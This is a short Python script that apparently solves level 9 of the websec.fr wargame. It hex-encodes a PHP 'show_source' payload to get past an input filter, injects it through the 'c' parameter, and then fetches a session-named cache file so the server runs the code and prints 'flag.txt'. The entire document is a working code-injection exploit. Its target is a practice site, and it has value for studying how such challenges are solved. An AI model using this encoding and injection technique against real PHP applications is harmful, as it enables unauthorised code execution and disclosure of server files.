import requests
s = requests.session()

from binascii import hexlify

payload = 'echo show_source(\'flag.txt\');'
encoded_payload = '\\x' + '\\x'.join([hexlify(_.encode()).decode() for _ in payload])


URL = "https://websec.fr/level09/index.php?"

r1 = s.get(URL + f"c={encoded_payload}&submit=Submit")
r2 = s.get(URL + f"cache_file=/tmp/{r1.cookies['session_id']}")
print(r2.text)